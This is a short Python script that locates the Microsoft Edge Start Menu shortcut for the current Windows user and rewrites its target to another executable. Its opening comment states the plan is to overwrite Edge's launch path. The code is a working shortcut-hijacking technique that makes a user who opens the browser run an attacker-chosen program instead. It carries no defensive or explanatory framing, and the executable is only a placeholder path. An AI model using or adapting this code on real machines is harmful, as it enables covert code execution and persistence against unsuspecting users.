#The plan is to overwrite the exectuable path on windows edge that will startup on launch
import os
import win32com.client
def get_edge_shortcut_path():
    #gets the username for the following filepath
    username = os.getlogin()
    
    #specifies filename and filepath
    edge_filename = "Microsoft Edge.lnk"  
    edge_path = fr"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Microsoft Edge"
    #checks to see if it indeed exists
    full_path = os.path.join(edge_path, edge_filename)
    
    if os.path.exists(full_path):
        return full_path
    else:
        return None

def change_shortcut_target(shortcut_path, new_target_path):
    # Get the full path to the shortcut
    shortcut_path = os.path.abspath(shortcut_path)

    # Create a shell object
    shell = win32com.client.Dispatch("WScript.Shell")

    try:
        # Load the shortcut
        shortcut = shell.CreateShortCut(shortcut_path)

        # Change the target path
        shortcut.Targetpath = os.path.abspath(new_target_path)

        # Save the changes
        shortcut.Save()

        print(f"Shortcut target path changed successfully: {shortcut_path}")
    except Exception as e:
        print(f"Error changing shortcut target path: {e}")

if __name__ == "__main__":
    shortcut_path = get_edge_shortcut_path()
    
    if shortcut_path:
        print("Original Path Found")
    else:
        print("Path not found")
    print(shortcut_path)
    new_target_path = r"C:\Path\to\your\new\executable.exe"

    # Change the shortcut target path
    change_shortcut_target(shortcut_path, new_target_path)
